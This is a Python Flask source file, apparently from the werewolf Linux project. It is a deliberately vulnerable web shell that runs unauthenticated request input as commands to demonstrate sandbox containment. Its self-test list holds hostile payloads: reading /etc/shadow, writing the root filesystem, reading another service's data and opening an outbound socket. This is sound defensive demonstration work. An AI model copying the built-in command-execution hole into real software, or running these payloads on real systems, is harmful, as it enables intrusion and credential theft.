"""webshell: a deliberately vulnerable web application, to show werewolf
contains one.

It does the worst thing a web application can do: it takes a string from an
unauthenticated HTTP request and runs it as a command, by a shell or by
fork/exec, with the response showing the output. That is remote code
execution by design -- the bug class behind a large share of real
breaches.

The point is what the attacker gets for it on werewolf: nothing worth
having. The command runs as the leashed `app` user (cmd/leash), on a root
that is read-only and dm-verity-checked, with:

  * no shell in the image, so a shell command finds no interpreter;
  * Landlock allowing exec of only the service's own python3 and the
    programs the `run` line names; Landlock grants exec per file, and
    Wolfi's coreutils is one multi-call binary, so naming id or cat allows
    every coreutils applet (dd, chroot, base64 ...) -- they run and gain
    nothing, held by the read/write floor, the dropped capabilities and the
    empty network -- while net-tools' separate binaries, ifconfig and route,
    are refused at the exec; an allowed reader sees only the floor's files,
    so `cat /etc/passwd` prints and `cat /etc/shadow` is refused;
  * reads confined to the image and the service's own directories, so
    /etc/shadow and other services' data are unreadable;
  * writes confined to /run/svc/app and /data/svc/app, so the root and
    everything else cannot be changed;
  * no outbound network (the service declares no `connect`), so fence
    drops any packet out, and Landlock refuses the socket.

So even full RCE -- arbitrary Python through the python3 that is allowed
to run -- cannot read a secret, change the system, persist, or call home.
A reboot returns the machine to the signed image regardless.

At boot the application attacks itself with a battery of representative
payloads and logs, as JSON on the console, that none escaped
(test/console-webshell-example). The page keeps the last 100 attempts,
each with its source, exit code and output, so a live visitor sees the
same.
"""

import collections
import datetime
import json
import os
import shlex
import subprocess
import sys
import threading

from flask import Flask, render_template_string, request

app = Flask(__name__)

MAX_ATTEMPTS = 100
MAX_OUTPUT = 2048
TIMEOUT = 5

# The last MAX_ATTEMPTS commands run, newest last. A deque is bounded, so
# memory cannot grow; nothing is written to disk, so nothing persists.
_attempts = collections.deque(maxlen=MAX_ATTEMPTS)
_lock = threading.Lock()


def _log(event, **fields):
    """One JSON line on the console, as werewolf's programs log."""
    rec = {"time": datetime.datetime.now(datetime.timezone.utc).isoformat(), "event": event}
    rec.update(fields)
    print("webshell: " + json.dumps(rec), flush=True)


def run(cmd, shell, source, agent):
    """Run cmd and record the attempt. Returns the record.

    This is the vulnerability: cmd comes straight from the request. shell
    chooses `sh -c cmd` over a fork/exec of cmd's own words, so a visitor
    can see that werewolf ships no shell for the first and confines the
    exec of the second.
    """
    record = {
        "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "source": source,
        "agent": agent,
        "mode": "shell" if shell else "exec",
        "cmd": cmd,
    }
    # stdout holds only what the command itself wrote; a Python traceback
    # goes to stderr, and echoes the -c source, so a success is judged from
    # stdout alone, never from the command text repeated back in an error.
    record["stdout"] = ""
    try:
        if shell:
            argv = cmd
        else:
            argv = shlex.split(cmd)
            if not argv:
                raise ValueError("empty command")
        done = subprocess.run(
            argv,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=TIMEOUT,
            cwd=os.environ.get("HOME", "."),
        )
        record["exit"] = done.returncode
        record["stdout"] = done.stdout
        record["output"] = (done.stdout + done.stderr)[:MAX_OUTPUT]
    except FileNotFoundError as e:
        # No /bin/sh for a shell command, or the named binary is absent.
        record["exit"] = None
        record["output"] = f"not found: {e}"
    except PermissionError as e:
        # Landlock refused the exec: the binary is there but not allowed.
        record["exit"] = None
        record["output"] = f"refused: {e}"
    except subprocess.TimeoutExpired:
        record["exit"] = None
        record["output"] = f"timed out after {TIMEOUT}s"
    except Exception as e:  # noqa: BLE001 -- a demo: show whatever went wrong
        record["exit"] = None
        record["output"] = f"{type(e).__name__}: {e}"
    with _lock:
        _attempts.append(record)
    return record


PAGE = """<!doctype html>
<title>werewolf webshell</title>
<style>
 body { font: 15px system-ui, sans-serif; margin: 2rem; max-width: 60rem; }
 h1 { font-size: 1.3rem; }
 .warn { background: #fee; border: 1px solid #c00; padding: .6rem .9rem; border-radius: 6px; }
 form { margin: 1rem 0; }
 input[type=text] { width: 70%; padding: .4rem; font-family: monospace; }
 table { border-collapse: collapse; width: 100%; margin-top: 1rem; }
 th, td { border-bottom: 1px solid #ddd; padding: .35rem .5rem; text-align: left; vertical-align: top; }
 td.out { font-family: monospace; white-space: pre-wrap; word-break: break-all; max-width: 24rem; }
 .exit0 { color: #080; } .exitX { color: #a00; }
</style>
<h1>werewolf webshell &mdash; a contained vulnerability</h1>
<p class="warn">This runs whatever you type, as a real web application with
remote code execution would. On werewolf it is caged: no shell; exec of
only its own python3 and the programs its leash allows (coreutils and
<code>hostname</code>); no writes outside its own data; no network out;
and even an allowed tool reads only what the cage permits. Try to escape
&mdash; or run <code>cat /etc/passwd</code> (works) and
<code>cat /etc/shadow</code> (refused) and see the difference.</p>
<form method="post">
  <input type="text" name="cmd" placeholder="e.g. cat /etc/shadow" autofocus>
  <label><input type="checkbox" name="shell" value="1"> Run within a shell</label>
  <button type="submit">Run</button>
</form>
<p>The last {{ attempts|length }} attempts (newest first):</p>
<table>
 <tr><th>time</th><th>source</th><th>mode</th><th>command</th><th>exit</th><th>output</th></tr>
 {% for a in attempts %}
 <tr>
  <td>{{ a.time }}</td>
  <td>{{ a.source }}<br><small>{{ a.agent }}</small></td>
  <td>{{ a.mode }}</td>
  <td class="out">{{ a.cmd }}</td>
  <td class="{{ 'exit0' if a.exit == 0 else 'exitX' }}">{{ a.exit if a.exit is not none else '-' }}</td>
  <td class="out">{{ a.output }}</td>
 </tr>
 {% endfor %}
</table>
<footer>
 <p><small>Everything running here is open: the application
 (<a href="https://github.com/werewolf-linux/werewolf/blob/main/forms/webshell-example/usr/lib/app/webshell.py">webshell.py</a>),
 its leash policy
 (<a href="https://github.com/werewolf-linux/werewolf/blob/main/forms/webshell-example/etc/sv/app/service">etc/sv/app/service</a>),
 and the form that builds it
 (<a href="https://github.com/werewolf-linux/werewolf/tree/main/forms/webshell-example">forms/webshell-example</a>).
 How it runs and is contained: <a href="https://github.com/werewolf-linux/werewolf/blob/main/docs/forms.md">docs/forms.md</a>.</small></p>
</footer>
"""


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        cmd = request.form.get("cmd", "")
        shell = request.form.get("shell") == "1"
        if cmd.strip():
            run(cmd, shell, request.remote_addr or "?", request.headers.get("User-Agent", "?"))
    # Jinja autoescapes, so an attacker's command and its output cannot
    # inject HTML into this page.
    with _lock:
        newest_first = list(reversed(_attempts))
    return render_template_string(PAGE, attempts=newest_first)


@app.get("/attempts.json")
def attempts_json():
    with _lock:
        return list(_attempts)


# Representative attacks, as a visitor would type them. Each aims at a real
# breach -- reading a secret, writing the root, reading another service's
# data, reaching the network -- so success is the same on the shipped image
# and on a DEV build that ships a shell: the shell is one more way in, not a
# breach by itself. goal is a string the attack prints to its own stdout
# only when it got what it was after, so finding it means the cage leaked.
# (A denied operation raises, printing a traceback to stderr, which echoes
# the command; stdout stays empty, and only stdout is judged.)
ATTACKS = [
    ("read a secret, via a shell", "cat /etc/shadow && echo LEAK", True, "LEAK"),
    ("read a secret, via fork/exec", "/bin/cat /etc/shadow", False, "root:"),
    (
        "read a secret, through the one binary that runs",
        "/usr/bin/python3 -c \"print('SECRET='+open('/etc/shadow').read())\"",
        False,
        "SECRET=",
    ),
    (
        "write the root filesystem",
        "/usr/bin/python3 -c \"open('/pwned','w').write('x'); print('WROTE')\"",
        False,
        "WROTE",
    ),
    (
        "read another service's data",
        "/usr/bin/python3 -c \"print('DATA='+open('/data/svc/postgres/data/postgresql.conf').read())\"",
        False,
        "DATA=",
    ),
    (
        "call home",
        "/usr/bin/python3 -c \"import socket; socket.create_connection(('10.0.2.2',9999),2); print('CONNECTED')\"",
        False,
        "CONNECTED",
    ),
    ("spawn a shell to read a secret", "sh -c 'cat /etc/shadow && echo LEAK'", True, "LEAK"),
    ("read a secret with an allowed tool", "cat /etc/shadow", False, "root:"),
]

# The commands the service's `run` line allows (etc/sv/app/service): real
# programs in the image that the leash lets this RCE exec, to show that
# execution does happen and is bounded by the allowlist, not by the tools
# being absent. Each should run and print something; none reveals a secret.
ALLOWED = [
    ("the account it runs as", "id", "uid=204"),
    ("the kernel it runs on", "uname -a", "Linux"),
    ("the host it runs on", "hostname", ""),
    ("the public account list", "cat /etc/passwd", "root:x:0:0"),
    ("a directory it may read", "ls /usr", "bin"),
    ("the first line of the account list", "head -n1 /etc/passwd", "root:x:0:0"),
    ("a line it prints itself", "echo contained-rce-works", "contained-rce-works"),
]


def self_test():
    escaped = 0
    for name, cmd, shell, goal in ATTACKS:
        rec = run(cmd, shell, "self-test", name)
        # Escaped only if the command exited cleanly and printed, on its
        # own stdout, the proof it produced the forbidden result. A denied
        # read, write or connect raises, so it exits non-zero with nothing
        # on stdout.
        leaked = rec["exit"] == 0 and goal in rec.get("stdout", "")
        # A write that somehow succeeded leaves the file, whatever it printed.
        if "/pwned" in cmd and os.path.exists("/pwned"):
            leaked = True
        rec["escaped"] = leaked
        if leaked:
            escaped += 1
        _log("attempt", attack=name, mode=rec["mode"], exit=rec["exit"], escaped=leaked)
    _log("self-test", attacks=len(ATTACKS), escaped=escaped)
    if escaped:
        # The cage leaked: say so loudly. The console test fails on this.
        print(f"webshell: ESCAPED on {escaped} attack(s)", file=sys.stderr, flush=True)

    # The allowlisted commands: each must run (exit 0, something on stdout),
    # proving the RCE executes and the `run` list permits exactly these.
    ran = 0
    for name, cmd, expect in ALLOWED:
        rec = run(cmd, False, "self-test", name)
        out = rec.get("stdout", "")
        # It ran if it exited cleanly with output, and gave the expected
        # content: `cat /etc/passwd` must show the public account list,
        # `echo` its argument, and so on -- proving the exec did real work,
        # not merely that it was permitted.
        ok = rec["exit"] == 0 and out.strip() != "" and expect in out
        if ok:
            ran += 1
        _log("allowed", command=cmd, exit=rec["exit"], ran=ok)
    _log("exec-allowed", commands=len(ALLOWED), ran=ran)
    if ran != len(ALLOWED):
        # The allowlist should let every one of these run and produce its
        # expected output; if not, the demo is not showing contained
        # execution. The console test fails on this.
        print(f"webshell: only {ran} of {len(ALLOWED)} allowed commands ran", file=sys.stderr, flush=True)


# Attack ourselves once the worker is up, off the request path.
threading.Thread(target=self_test, daemon=True).start()
